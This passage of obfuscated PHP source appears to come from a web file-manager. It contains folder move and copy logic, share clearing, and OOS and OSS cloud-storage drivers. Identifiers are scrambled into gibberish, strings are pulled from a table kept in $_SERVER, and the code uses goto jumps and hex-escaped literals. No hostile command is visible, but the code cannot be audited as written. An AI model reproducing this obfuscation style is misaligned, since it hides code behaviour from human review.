$_SERVER[ÏéâËõ‘]; $¾ñ¯©äÜ = $this->sourceInfo($­èÄµ™¬); $ãŠÃƒ™Ÿ = $‘“‰Ğşï[595]; $í¹è¦ß‘ = array($‘“‰Ğşï[521] => array($‘“‰Ğşï[550], $¾ñ¯©äÜ[$‘“‰Ğşï[521]] . $­èÄµ™¬ . $‘“‰Ğşï[551]), $‘“‰Ğşï[431] => $this->targetIsDelete); $ìáÚÈòî = $this->field($ãŠÃƒ™Ÿ)->where($í¹è¦ß‘)->select(); if (!$ìáÚÈòî) { return; } $ìáÚÈòî = array_to_keyvalue($ìáÚÈòî, $‘“‰Ğşï[402]); foreach ($ìáÚÈòî as $ç˜¹öú¯) { $…ä­¢ = $ç˜¹öú¯[$‘“‰Ğşï[432]]; $­èÄµ™¬ = $ç˜¹öú¯[$‘“‰Ğşï[402]]; if (!isset($this->_childrenListCache[$­èÄµ™¬]) && $ç˜¹öú¯[$‘“‰Ğşï[410]] == $‘“‰Ğşï[88]) { $this->_childrenListCache[$­èÄµ™¬] = array(); } if (!isset($this->_childrenListCache[$…ä­¢])) { $this->_childrenListCache[$…ä­¢] = array(); } $this->_childrenListCache[$…ä­¢][$­èÄµ™¬] = $ç˜¹öú¯; $this->_childrenItemCache[$­èÄµ™¬] = $ç˜¹öú¯; } } private function _childrenListAll($ÕØéìğµ, &$´ÁÀ‹Ü) { $ò÷¥úË =& $_SERVER[ÏéâËõ‘]; if (!isset($this->_childrenListCache[$ÕØéìğµ])) { return; } $½â‰·¼ø = $this->_childrenListCache[$ÕØéìğµ]; foreach ($½â‰·¼ø as $ëíßô‰– => $Æ¤ÃÆ‚) { $´ÁÀ‹Ü[$ëíßô‰–] = $Æ¤ÃÆ‚; if ($Æ¤ÃÆ‚[$ò÷¥úË[410]] == $ò÷¥úË[88]) { $this->_childrenListAll($ëíßô‰–, $´ÁÀ‹Ü); } } } private function sourceInfoCache($ÒÁ‘ø²Õ) { if (isset($this->_childrenItemCache[$ÒÁ‘ø²Õ])) { return $this->_childrenItemCache[$ÒÁ‘ø²Õ]; } return $this->sourceInfo($ÒÁ‘ø²Õ); } private function _childrenList($²¡á­Ÿã) { if (isset($this->_childrenListCache[$²¡á­Ÿã])) { return $this->_childrenListCache[$²¡á­Ÿã]; } return $this->_childrenListSelect($²¡á­Ÿã); } private function _childrenListSelect($£¾ÕÑò†) { $çÈìç‰¹ =& $_SERVER[ÏéâËõ‘]; $¬¯¨üÒ = array($çÈìç‰¹[432] => $£¾ÕÑò†, $çÈìç‰¹[431] => $this->targetIsDelete); $æ…¾‚¡® = $this->where($¬¯¨üÒ)->select(); $æ…¾‚¡® = $æ…¾‚¡® ? $æ…¾‚¡® : array(); $¢¬ìÓ˜× = array_to_keyvalue($æ…¾‚¡®, $çÈìç‰¹[402]); $this->_childrenListCache[$£¾ÕÑò†] = $¢¬ìÓ˜×; foreach ($¢¬ìÓ˜× as $£¾ÕÑò† => $ËÉŸó•) { $this->_childrenItemCache[$£¾ÕÑò†] = $ËÉŸó•; } return $¢¬ìÓ˜×; } private function fileNameExistCache($ğ•ëşù÷, $ÂôøĞıè) { $”†Öîğ =& $_SERVER[ÏéâËõ‘]; $ÂôøĞıè = strtolower($ÂôøĞıè); $ä˜Óİ¹„ = $this->_childrenList($ğ•ëşù÷); foreach ($ä˜Óİ¹„ as $‹¹üğ¨ô) { if ($ÂôøĞıè == strtolower($‹¹üğ¨ô[$”†Öîğ[32]])) { return $‹¹üğ¨ô[$”†Öîğ[402]]; } } return !1; } private function fileNameAutoCache($ş°ììúä, $†”­ÆØ˜, $‡‰³›û¯, $Ë·á•×Ç) { $ŸõŞÔ¼ =& $_SERVER[ÏéâËõ‘]; $Õî¦¹œæ = $this->_childrenList($ş°ììúä); $­ƒ¬¼œÇ = array_to_keyvalue($Õî¦¹œæ, $ŸõŞÔ¼[12], $ŸõŞÔ¼[32]); return $this->fileNameAutoGet($­ƒ¬¼œÇ, $†”­ÆØ˜, $‡‰³›û¯, $Ë·á•×Ç); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ûÂ«•ù•, $¦ö·àŞ„, $Àï¶ª¶Ø = REPEAT_REPLACE, $Œ¯ÀÀÌ‚ = '') { $øïüƒàá =& $_SERVER[ÏéâËõ‘]; $«±®“ğü = $this->sourceInfo($ûÂ«•ù•); $“˜‘…üï = $this->sourceInfo($¦ö·àŞ„); if ($«±®“ğü[$øïüƒàá[432]] == $“˜‘…üï[$øïüƒàá[402]]) { if ($«±®“ğü[$øïüƒàá[431]] == $øïüƒàá[88]) { Model($øïüƒàá[429])->restore(array($ûÂ«•ù•)); } if (!$Œ¯ÀÀÌ‚ || $Œ¯ÀÀÌ‚ == $«±®“ğü[$øïüƒàá[32]]) { return $ûÂ«•ù•; } } $üû‰ºÄ = $this->pathInfoMore($ûÂ«•ù•); if ($this->isParentOf($ûÂ«•ù•, $¦ö·àŞ„)) { return !1; } if (!$«±®“ğü || !$“˜‘…üï || $“˜‘…üï[$øïüƒàá[410]] != $øïüƒàá[88]) { return !1; } Hook::trigger($øïüƒàá[596], $üû‰ºÄ); $this->targetIsDelete = intval($«±®“ğü[$øïüƒàá[431]]); if ($«±®“ğü[$øïüƒàá[432]] == $¦ö·àŞ„ && $Œ¯ÀÀÌ‚ != $«±®“ğü[$øïüƒàá[32]]) { $äíÚ²çŠ = $this->fileNameExist($¦ö·àŞ„, $Œ¯ÀÀÌ‚); if ($äíÚ²çŠ && $«±®“ğü[$øïüƒàá[410]] == $øïüƒàá[197]) { $ÚÏŒûÓœ = $this->sourceInfo($äíÚ²çŠ); $óÜª¡­ˆ = $this->fileHistory($ÚÏŒûÓœ, $«±®“ğü[$øïüƒàá[468]], $«±®“ğü[$øïüƒàá[76]]); if (!$óÜª¡­ˆ) { Model($øïüƒàá[471])->remove($«±®“ğü[$øïüƒàá[468]]); } $this->removeNow($ûÂ«•ù•, !1); $this->folderSizeReset($¦ö·àŞ„); Hook::trigger($øïüƒàá[597], $üû‰ºÄ); return $äíÚ²çŠ; } } $…éÓÀ«¿ = $Œ¯ÀÀÌ‚ ? $Œ¯ÀÀÌ‚ : $«±®“ğü[$øïüƒàá[32]]; $this->lockMoveStart($ûÂ«•ù•); $this->lockWriteStart($¦ö·àŞ„, $…éÓÀ«¿); $åá„·ş = array($øïüƒàá[566] => array(), $øïüƒàá[598] => !1); $this->clearShare($ûÂ«•ù•, $¦ö·àŞ„); $°–Ëü¶ = $this->fileNameExistCache($¦ö·àŞ„, $«±®“ğü[$øïüƒàá[32]]); $ØÆ¨ Ñ = $this->_move($ûÂ«•ù•, $¦ö·àŞ„, $Àï¶ª¶Ø, $åá„·ş, $Œ¯ÀÀÌ‚); $this->sourceCacheClear(); if ($«±®“ğü[$øïüƒàá[410]] == $øïüƒàá[88] && $°–Ëü¶) { $this->folderSizeResetChildren($ØÆ¨ Ñ); } Model($øïüƒàá[199])->linkAdd($åá„·ş[$øïüƒàá[566]]); if ($°–Ëü¶ && $åá„·ş[$øïüƒàá[598]]) { $this->removeNow($ûÂ«•ù•, !1); } $this->lockMoveEnd($ûÂ«•ù•); $this->lockWriteEnd($¦ö·àŞ„, $…éÓÀ«¿); $this->folderSizeReset($«±®“ğü[$øïüƒàá[432]]); $this->folderSizeReset($¦ö·àŞ„); $Ü»¼½Áï = array($«±®“ğü[$øïüƒàá[432]], $¦ö·àŞ„); if ($«±®“ğü[$øïüƒàá[410]] == $øïüƒàá[88]) { $Ü»¼½Áï[] = $ûÂ«•ù•; } $this->updateModifyTime($Ü»¼½Áï); Model($øïüƒàá[570])->eventMove($ûÂ«•ù•, $«±®“ğü[$øïüƒàá[432]], $¦ö·àŞ„); Hook::trigger($øïüƒàá[597], $üû‰ºÄ); return $ØÆ¨ Ñ; } private function _move($™«”ê•€, $îÓËŒ÷, $“³ ¢—¹, &$©ó¥ÌÚ, $×øãáæ¥ = '') { $ÌŒšñ¨ =& $_SERVER[ÏéâËõ‘]; $ÈĞ¾á®· = $this->sourceInfo($™«”ê•€); $Ö£ƒù¡£ = $ÈĞ¾á®·[$ÌŒšñ¨[410]] == $ÌŒšñ¨[88]; $‘®››ç¶ = $×øãáæ¥ ? $×øãáæ¥ : $ÈĞ¾á®·[$ÌŒšñ¨[32]]; $ÏÊ‡ğáâ = $this->fileNameExistCache($îÓËŒ÷, $‘®››ç¶); $this->lockMoveStart($™«”ê•€); $this->lockWriteStart($îÓËŒ÷, $‘®››ç¶); if (!$ÏÊ‡ğáâ) { return $this->_moveForce($™«”ê•€, $îÓËŒ÷, $‘®››ç¶); } $»³»”·Š = $ÏÊ‡ğáâ; $œóÚ™¾ = !1; if ($Ö£ƒù¡£) { if ($“³ ¢—¹ == REPEAT_RENAME_FOLDER) { $‘®››ç¶ = $this->fileNameAuto($îÓËŒ÷, $‘®››ç¶, $“³ ¢—¹, $Ö£ƒù¡£); $»³»”·Š = $this->_moveForce($™«”ê•€, $îÓËŒ÷, $‘®››ç¶); } else { if ($“³ ¢—¹ == REPEAT_RENAME_FOLDER) { $“³ ¢—¹ = REPEAT_RENAME; } $¯±Ğ°Ÿ¦ = $this->_childrenListSelect($™«”ê•€); foreach ($¯±Ğ°Ÿ¦ as $èŞ¹úíë) { $this->_move($èŞ¹úíë[$ÌŒšñ¨[402]], $ÏÊ‡ğáâ, $“³ ¢—¹, $©ó¥ÌÚ); } $œóÚ™¾ = !0; } } else { if ($“³ ¢—¹ == REPEAT_SKIP) { $œóÚ™¾ = !0; } else { if ($“³ ¢—¹ == REPEAT_RENAME || $“³ ¢—¹ == REPEAT_RENAME_FOLDER) { $‘®››ç¶ = $this->fileNameAuto($îÓËŒ÷, $‘®››ç¶, $“³ ¢—¹, $Ö£ƒù¡£); $»³»”·Š = $this->_moveForce($™«”ê•€, $îÓËŒ÷, $‘®››ç¶); } else { if ($“³ ¢—¹ == REPEAT_REPLACE) { $µİíçè‡ = $this->sourceInfoCache($ÏÊ‡ğáâ); $½Êà •Æ = $this->fileHistory($µİíçè‡, $ÈĞ¾á®·[$ÌŒšñ¨[468]], $ÈĞ¾á®·[$ÌŒšñ¨[76]]); $œóÚ™¾ = !0; if ($½Êà •Æ) { $©ó¥ÌÚ[$ÌŒšñ¨[566]][] = $ÈĞ¾á®·[$ÌŒšñ¨[468]]; } } } } } if ($œóÚ™¾ && !$©ó¥ÌÚ[$ÌŒšñ¨[598]]) { $©ó¥ÌÚ[$ÌŒšñ¨[598]] = !0; } return $»³»”·Š; } private function _moveForce($Î±Ö‚š, $ÊÂş§ãí, $´« Á¿¢) { $÷ƒÜÌê =& $_SERVER[ÏéâËõ‘]; $—Ï ª§¼ = $this->sourceInfo($Î±Ö‚š); $¦ÚŒÜ®ô = $this->sourceInfo($ÊÂş§ãí); $ïÅ™šÃ = $—Ï ª§¼[$÷ƒÜÌê[410]] == $÷ƒÜÌê[88]; $àÕ­Ÿ‰É = array($÷ƒÜÌê[401] => $¦ÚŒÜ®ô[$÷ƒÜÌê[402]], $÷ƒÜÌê[590] => $¦ÚŒÜ®ô[$÷ƒÜÌê[521]] . $¦ÚŒÜ®ô[$÷ƒÜÌê[402]] . $÷ƒÜÌê[50], $÷ƒÜÌê[586] => $¦ÚŒÜ®ô[$÷ƒÜÌê[411]], $÷ƒÜÌê[587] => $¦ÚŒÜ®ô[$÷ƒÜÌê[505]], $÷ƒÜÌê[589] => USER_ID, $÷ƒÜÌê[420] => $´« Á¿¢); $‚Áà¢„Ö = $—Ï ª§¼[$÷ƒÜÌê[411]] == SourceModel::TYPE_GROUP && $¦ÚŒÜ®ô[$÷ƒÜÌê[411]] == SourceModel::TYPE_GROUP && $—Ï ª§¼[$÷ƒÜÌê[505]] == $¦ÚŒÜ®ô[$÷ƒÜÌê[505]]; if (!$‚Áà¢„Ö && $this->moveClearAuth) { Model($÷ƒÜÌê[502])->authClear($Î±Ö‚š); } $’×‚‡¶¹ = $—Ï ª§¼[$÷ƒÜÌê[431]] == $÷ƒÜÌê[88] && $¦ÚŒÜ®ô[$÷ƒÜÌê[431]] != $÷ƒÜÌê[88]; if ($’×‚‡¶¹) { $àÕ­Ÿ‰É[$÷ƒÜÌê[430]] = 0; } if ($ïÅ™šÃ) { $Ò¥ÑÁğ = array($÷ƒÜÌê[590] => array($÷ƒÜÌê[550], $—Ï ª§¼[$÷ƒÜÌê[521]] . $—Ï ª§¼[$÷ƒÜÌê[402]] . $÷ƒÜÌê[551])); $¿ÍÍªñØ = $—Ï ª§¼[$÷ƒÜÌê[521]] . $—Ï ª§¼[$÷ƒÜÌê[402]] . $÷ƒÜÌê[50]; $¿şõÏÛğ = $¦ÚŒÜ®ô[$÷ƒÜÌê[521]] . $¦ÚŒÜ®ô[$÷ƒÜÌê[402]] . $÷ƒÜÌê[50] . $—Ï ª§¼[$÷ƒÜÌê[402]] . $÷ƒÜÌê[50]; $ø”È¥éŸ = array($÷ƒÜÌê[590] => array($÷ƒÜÌê[599], "\x72\x65\x70\x6c\x61\x63\145\50\160\141\162\x65\x6e\164\x4c\x65\166\145\154\54\x27{$¿ÍÍªñØ}\47\x2c\47{$¿şõÏÛğ}\x27\x29"), $÷ƒÜÌê[586] => $¦ÚŒÜ®ô[$÷ƒÜÌê[411]], $÷ƒÜÌê[587] => $¦ÚŒÜ®ô[$÷ƒÜÌê[505]]); if ($’×‚‡¶¹) { $ø”È¥éŸ[$÷ƒÜÌê[430]] = 0; } $this->where($Ò¥ÑÁğ)->data($ø”È¥éŸ)->save(); } $this->where(array($÷ƒÜÌê[417] => $Î±Ö‚š))->data($àÕ­Ÿ‰É)->save(); return $Î±Ö‚š; } private function clearShare($˜ˆ‘ÙÊ, $Ñ›îúÛ) { $ƒİ²©¥© =& $_SERVER[ÏéâËõ‘]; $¸ó‚ä› = $this->sourceInfo($˜ˆ‘ÙÊ); $ŸûÌô¤ç = $this->sourceInfo($Ñ›îúÛ); if ($¸ó‚ä›[$ƒİ²©¥©[505]] == $ŸûÌô¤ç[$ƒİ²©¥©[505]] && $¸ó‚ä›[$ƒİ²©¥©[411]] == $ƒİ²©¥©[600]) { return; } $ñŠ»•¨ø = array($ƒİ²©¥©[521] => array($ƒİ²©¥©[550], $¸ó‚ä›[$ƒİ²©¥©[521]] . $˜ˆ‘ÙÊ . $ƒİ²©¥©[551])); $ÛÔÔÊï˜ = $this->field($ƒİ²©¥©[417])->where($ñŠ»•¨ø)->getField($ƒİ²©¥©[402], !0); if (!$ÛÔÔÊï˜) { return; } $ñŠ»•¨ø = array($ƒİ²©¥©[402] => array($ƒİ²©¥©[7], $ÛÔÔÊï˜), $ƒİ²©¥©[496] => 1); $™š±á = Model($ƒİ²©¥©[601])->field($ƒİ²©¥©[489])->where($ñŠ»•¨ø)->select(); if (!$™š±á) { return; } $™š±á = array_to_keyvalue($™š±á, $ƒİ²©¥©[12], $ƒİ²©¥©[489]); $ñŠ»•¨ø = array($ƒİ²©¥©[489] => array($ƒİ²©¥©[7], $™š±á)); Model($ƒİ²©¥©[601])->where($ñŠ»•¨ø)->save(array($ƒİ²©¥©[496] => 0)); Model($ƒİ²©¥©[602])->where($ñŠ»•¨ø)->delete(); } public function copyFolderFromIO($ïˆˆÖ·ö, $½äß§„‡, $‚‘•ƒ´÷, $–Ó˜ñ·°, $Ÿ³˜‚»ê, $ŸğÙ“Šá = false) { $’ß›—× =& $_SERVER[ÏéâËõ‘]; $€­µ·ËÇ = array($’ß›—×[567] => array(), $’ß›—×[568] => array(), $’ß›—×[566] => array(), $’ß›—×[603] => array()); $ğÑ›˜—¯ = $ŸğÙ“Šá ? $ŸğÙ“Šá : $ïˆˆÖ·ö->pathThis($½äß§„‡); $ª¹«ü¶“ = $this->fileNameExist($‚‘•ƒ´÷, $ğÑ›˜—¯); $åÕ´ñòµ = $this->mkdir($‚‘•ƒ´÷, $ğÑ›˜—¯, $–Ó˜ñ·°); if (!$ª¹«ü¶“ || $–Ó˜ñ·° == REPEAT_RENAME_FOLDER) { $–Ó˜ñ·° = !1; } if ($ª¹«ü¶“) { $this->_childrenAllMake($ª¹«ü¶“); } Hook::trigger($’ß›—×[604]); $this->_copyChildTo($ïˆˆÖ·ö, $½äß§„‡, $åÕ´ñòµ, $–Ó˜ñ·°, $€­µ·ËÇ, $Ÿ³˜‚»ê); Hook::trigger($’ß›—×[605]); if ($åÕ´ñòµ) { $this->folderSizeResetChildren($åÕ´ñòµ); } $this->_childrenListClear(); Model($’ß›—×[569])->addAll($€­µ·ËÇ[$’ß›—×[567]], array(), !0); Model($’ß›—×[570])->eventCopy($åÕ´ñòµ); $this->saveAll($€­µ·ËÇ[$’ß›—×[568]]); Model($’ß›—×[471])->linkAdd($€­µ·ËÇ[$’ß›—×[566]]); Model($’ß›—×[471])->remove($€­µ·ËÇ[$’ß›—×[603]]); $this->folderSizeReset($‚‘•ƒ´÷); $this->updateModifyTime($‚‘•ƒ´÷); return $åÕ´ñòµ; } private function _copyChildTo($àÑ¡¬², $“†ğ‚Ü, $‘ú¬ê¸, $şĞÎô§, &$¸ÒŸ¶ã˜, $Ñúñ€‰) { $ŒğùÊ–Ú =& $_SERVER[ÏéâËõ‘]; $ª¤ßœ = $this->sourceInfoCache($‘ú¬ê¸); $€˜ÅÉã = $àÑ¡¬²->listPath($“†ğ‚Ü); $€˜ÅÉã = $€˜ÅÉã ? $€˜ÅÉã : array($ŒğùÊ–Ú[83] => array(), $ŒğùÊ–Ú[82] => array()); $ğùÆ±Ïİ = array_merge($€˜ÅÉã[$ŒğùÊ–Ú[83]], $€˜ÅÉã[$ŒğùÊ–Ú[82]]); $íª¥ÍŒ— = $this->_addFiles($àÑ¡¬², $€˜ÅÉã[$ŒğùÊ–Ú[83]], $Ñúñ€‰); $‡ÆíşÄÜ = array(); foreach ($ğùÆ±Ïİ as &$®†Íœ¯) { if (isset($íª¥ÍŒ—[$®†Íœ¯[$ŒğùÊ–Ú[32]]])) { $®†Íœ¯ = $íª¥ÍŒ—[$®†Íœ¯[$ŒğùÊ–Ú[32]]]; } $®†Íœ¯[$ŒğùÊ–Ú[410]] = $®†Íœ¯[$ŒğùÊ–Ú[33]] == $ŒğùÊ–Ú[75]; $®†Íœ¯[$ŒğùÊ–Ú[412]] = substr(_get($®†Íœ¯, $ŒğùÊ–Ú[174], $ŒğùÊ–Ú[12]), 0, 10); $®†Íœ¯[$ŒğùÊ–Ú[76]] = _get($®†Íœ¯, $ŒğùÊ–Ú[76], 0); $®†Íœ¯[$ŒğùÊ–Ú[468]] = _get($®†Íœ¯, $ŒğùÊ–Ú[468], 0); if (!isset($®†Íœ¯[$ŒğùÊ–Ú[606]]) && $®†Íœ¯[$ŒğùÊ–Ú[468]]) { $¸ÒŸ¶ã˜[$ŒğùÊ–Ú[603]][] = $®†Íœ¯[$ŒğùÊ–Ú[468]]; } if ($şĞÎô§) { $É•ÑÅÁş = $this->fileNameExistCache($‘ú¬ê¸, $®†Íœ¯[$ŒğùÊ–Ú[32]]); if ($É•ÑÅÁş) { if ($®†Íœ¯[$ŒğùÊ–Ú[410]] || $şĞÎô§ == REPEAT_SKIP) { continue; } if ($şĞÎô§ == REPEAT_REPLACE) { $áû· = $this->sourceInfoCache($É•ÑÅÁş); $Ÿ²ŞÖÉ’ = $this->fileHistory($áû·, $®†Íœ¯[$ŒğùÊ–Ú[468]], $®†Íœ¯[$ŒğùÊ–Ú[76]]); if ($Ÿ²ŞÖÉ’) { $¸ÒŸ¶ã˜[$ŒğùÊ–Ú[566]][] = $®†Íœ¯[$ŒğùÊ–Ú[468]]; } continue; } else { if ($şĞÎô§ == REPEAT_RENAME) { $®†Íœ¯[$ŒğùÊ–Ú[32]] = $this->fileNameAutoCache($‘ú¬ê¸, $®†Íœ¯[$ŒğùÊ–Ú[32]], $şĞÎô§, !1); } } } } if (!$®†Íœ¯[$ŒğùÊ–Ú[410]] && $®†Íœ¯[$ŒğùÊ–Ú[468]] == 0) { continue; } if (!$®†Íœ¯[$ŒğùÊ–Ú[410]] && $®†Íœ¯[$ŒğùÊ–Ú[468]]) { $¸ÒŸ¶ã˜[$ŒğùÊ–Ú[566]][] = $®†Íœ¯[$ŒğùÊ–Ú[468]]; } $‡ÆíşÄÜ[] = $this->_makeItemData($®†Íœ¯, $ª¤ßœ, $®†Íœ¯[$ŒğùÊ–Ú[32]]); } unset($®†Íœ¯); if (!empty($‡ÆíşÄÜ)) { $this->addAll($‡ÆíşÄÜ); $this->_childrenListSelect($‘ú¬ê¸); } $î‘ÜÓì = $this->_childrenList($‘ú¬ê¸); $î‘ÜÓì = array_to_keyvalue($î‘ÜÓì, $ŒğùÊ–Ú[32]); foreach ($ğùÆ±Ïİ as $®†Íœ¯) { $áû· = $î‘ÜÓì[$®†Íœ¯[$ŒğùÊ–Ú[32]]]; $Â¾Ğ®Ğ = $áû·[$ŒğùÊ–Ú[402]]; $this->_copyApplyMeta($áû·, $¸ÒŸ¶ã˜); if ($®†Íœ¯[$ŒğùÊ–Ú[33]] == $ŒğùÊ–Ú[75]) { $®†Íœ¯[$ŒğùÊ–Ú[84]] = $àÑ¡¬²->getPathInner($®†Íœ¯[$ŒğùÊ–Ú[84]]); $this->_copyChildTo($àÑ¡¬², $®†Íœ¯[$ŒğùÊ–Ú[84]], $Â¾Ğ®Ğ, $şĞÎô§, $¸ÒŸ¶ã˜, $Ñúñ€‰); } } } private function _addFiles($¶í˜Ç§ñ, $éÕâÀ”“, $Ç–ˆ²Öœ) { $Ó¥á‰°° =& $_SERVER[ÏéâËõ‘]; if (!$éÕâÀ”“ || count($éÕâÀ”“) == 0) { return array(); } $©…¼Ù» = array(); foreach ($éÕâÀ”“ as &$£Õ¹²¥¬) { Hook::trigger($Ó¥á‰°°[607], $£Õ¹²¥¬); $£Õ¹²¥¬[$Ó¥á‰°°[84]] = $¶í˜Ç§ñ->getPathInner($£Õ¹²¥¬[$Ó¥á‰°°[84]]); $ò¸…»©Î = $¶í˜Ç§ñ->hashSimple($£Õ¹²¥¬[$Ó¥á‰°°[84]]); $ä€§ñÖÖ = $¶í˜Ç§ñ->hashMd5($£Õ¹²¥¬[$Ó¥á‰°°[84]]); if (strlen($ä€§ñÖÖ) > 10 && !isset($©…¼Ù»[$ä€§ñÖÖ])) { $©…¼Ù»[$ä€§ñÖÖ] = array(); } $£Õ¹²¥¬[$Ó¥á‰°°[177]] = $ò¸…»©Î; $£Õ¹²¥¬[$Ó¥á‰°°[176]] = $ä€§ñÖÖ; $©…¼Ù»[$ä€§ñÖÖ][] =& $£Õ¹²¥¬; if (count($©…¼Ù»[$ä€§ñÖÖ]) > 1) { $£Õ¹²¥¬[$Ó¥á‰°°[606]] = !0; } Hook::trigger($Ó¥á‰°°[608], $£Õ¹²¥¬); } unset($£Õ¹²¥¬); $ªğ½´ÌÖ = array($Ó¥á‰°°[176] => array($Ó¥á‰°°[7], array_keys($©…¼Ù»))); $à°—È»œ = Model($Ó¥á‰°°[609]); $ê„Å¥œÚ = $à°—È»œ->where($ªğ½´ÌÖ)->select(); $ê„Å¥œÚ = $ê„Å¥œÚ ? $ê„Å¥œÚ : array(); foreach ($ê„Å¥œÚ as $°ÚãÎ•ö) { if (!isset($©…¼Ù»[$°ÚãÎ•ö[$Ó¥á‰°°[176]]])) { continue; } $ŸÒ»ØÏ = $©…¼Ù»[$°ÚãÎ•ö[$Ó¥á‰°°[176]]]; foreach ($ŸÒ»ØÏ as &$£Õ¹²¥¬) { $£Õ¹²¥¬[$Ó¥á‰°°[468]] = $°ÚãÎ•ö[$Ó¥á‰°°[468]]; $£Õ¹²¥¬[$Ó¥á‰°°[606]] = !0; } unset($£Õ¹²¥¬); } $åÀûø‚¨ = array(); foreach ($éÕâÀ”“ as $×¯—Ÿ¸¨) { Hook::trigger($Ó¥á‰°°[610], $×¯—Ÿ¸¨); if (isset($×¯—Ÿ¸¨[$Ó¥á‰°°[606]]) && $×¯—Ÿ¸¨[$Ó¥á‰°°[606]]) { Hook::trigger($Ó¥á‰°°[611], $×¯—Ÿ¸¨); continue; } $ƒïìŠû— = $¶í˜Ç§ñ->getPathInner($×¯—Ÿ¸¨[$Ó¥á‰°°[84]]); $é¿ÌöÜ = $à°—È»œ->addFileMake($ƒïìŠû—, $×¯—Ÿ¸¨[$Ó¥á‰°°[76]], $×¯—Ÿ¸¨[$Ó¥á‰°°[177]], $×¯—Ÿ¸¨[$Ó¥á‰°°[176]], $×¯—Ÿ¸¨[$Ó¥á‰°°[32]], $Ç–ˆ²Öœ); Hook::trigger($Ó¥á‰°°[611], $×¯—Ÿ¸¨); if (!is_array($é¿ÌöÜ)) { continue; } $åÀûø‚¨[] = $é¿ÌöÜ; } $à°—È»œ->addAll($åÀûø‚¨); $ªğ½´ÌÖ = array($Ó¥á‰°°[176] => array($Ó¥á‰°°[7], array_keys($©…¼Ù»))); $ê„Å¥œÚ = $à°—È»œ->where($ªğ½´ÌÖ)->select(); $ê„Å¥œÚ = $ê„Å¥œÚ ? $ê„Å¥œÚ : array(); foreach ($ê„Å¥œÚ as $°ÚãÎ•ö) { if (!isset($©…¼Ù»[$°ÚãÎ•ö[$Ó¥á‰°°[176]]])) { continue; } $ú´ûš¶ =& $©…¼Ù»[$°ÚãÎ•ö[$Ó¥á‰°°[176]]]; foreach ($ú´ûš¶ as &$£Õ¹²¥¬) { $£Õ¹²¥¬[$Ó¥á‰°°[468]] = $°ÚãÎ•ö[$Ó¥á‰°°[468]]; } unset($£Õ¹²¥¬); } $‹‰¸î«¶ = array(); foreach ($éÕâÀ”“ as $ÂíÁˆî) { $‹‰¸î«¶[$ÂíÁˆî[$Ó¥á‰°°[32]]] = $ÂíÁˆî; } return $‹‰¸î«¶; } } goto cÈ¥­Š‹•; BØ›ŠõØŞ¡: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¸¸‚İ¢–) { parent::__construct($¸¸‚İ¢–); $this->signatureVersion($_SERVER[ÏéâËõ‘][216]); } public function fileOutLink($ˆùÜ’ª) { $ğåÌÕ±ä =& $_SERVER[ÏéâËõ‘]; if (substr($ˆùÜ’ª, 0, 7) == $ğåÌÕ±ä[1330]) { $ˆùÜ’ª = $ğåÌÕ±ä[1331] . substr($ˆùÜ’ª, 7); } header($ğåÌÕ±ä[161] . $ˆùÜ’ª); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($«²àüÊ‡) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÏéâËõ‘][1388]; $this->_init($«²àüÊ‡); } public function _init($²ù€ˆ¦¼) { $¾ë˜ó‹õ =& $_SERVER[ÏéâËõ‘]; foreach ($²ù€ˆ¦¼ as $Œû½·ºî => $Ş¬åßú¯) { if (isset($this->{$Œû½·ºî})) { $this->{$Œû½·ºî} = $Ş¬åßú¯; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¾ë˜ó‹õ[1389] . LNG($¾ë˜ó‹õ[1390])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $İİ±ı»— =& $_SERVER[ÏéâËõ‘]; $É¶çüıã = new OSS\Model\CorsConfig(); $à¢±àËş = new OSS\Model\CorsRule(); $à¢±àËş->addAllowedOrigin($İİ±ı»—[1391]); $à¢±àËş->addAllowedMethod($İİ±ı»—[1392]); $à¢±àËş->addAllowedMethod($İİ±ı»—[1393]); $à¢±àËş->addAllowedMethod($İİ±ı»—[1394]); $à¢±àËş->addAllowedMethod($İİ±ı»—[1395]); $à¢±àËş->addAllowedMethod($İİ±ı»—[160]); $à¢±àËş->setMaxAgeSeconds(600); $à¢±àËş->addExposeHeader($İİ±ı»—[1396]); $à¢±àËş->addAllowedHeader($İİ±ı»—[1391]); $É¶çüıã->addRule($à¢±àËş); try { $this->client->putBucketCors($this->bucket, $É¶çüıã); } catch (OSS\Core\OssException $¸Ë«³Ò‚) { return !1; } return !0; } public function getBucketCors() { $üÁî¶”† =& $_SERVER[ÏéâËõ‘]; $ÚÌ‰€´„ = null; try { $ÚÌ‰€´„ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÜÖğ©¸ï) { return null; } if (!$ÚÌ‰€´„ || !($ÑÓ€öÑ  = $ÚÌ‰€´„->getRules())) { return null; } $³Ì´ôÄ = $ÑÓ€öÑ [0]->getAllowedOrigins(); $®Éâ‰ · = $ÑÓ€öÑ [0]->getAllowedMethods(); $àÜˆ¡à¶ = $ÑÓ€öÑ [0]->getMaxAgeSeconds(); $øÂÕôÂš = $ÑÓ€öÑ [0]->getExposeHeaders(); $öÇŒªÏÛ = $ÑÓ€öÑ [0]->getAllowedHeaders(); return array($üÁî¶”†[187] => isset($³Ì´ôÄ[0]) ? $³Ì´ôÄ[0] : $üÁî¶”†[12], $üÁî¶”†[191] => $®Éâ‰ ·, $üÁî¶”†[1397] => $àÜˆ¡à¶, $üÁî¶”†[1398] => isset($øÂÕôÂš[0]) ? $øÂÕôÂš[0] : $üÁî¶”†[12], $üÁî¶”†[189] => isset($öÇŒªÏÛ[0]) ? $öÇŒªÏÛ[0] : $üÁî¶”†[12]); } public function isBucketCors() { $Ø®Üšå™ =& $_SERVER[ÏéâËõ‘]; $¼÷ë™…÷ = $this->getBucketCors(); if (!$¼÷ë™…÷ || !is_array($¼÷ë™…÷)) { return !1; } if ($¼÷ë™…÷[$Ø®Üšå™[187]] != $Ø®Üšå™[188] || $¼÷ë™…÷[$Ø®Üšå™[189]] != 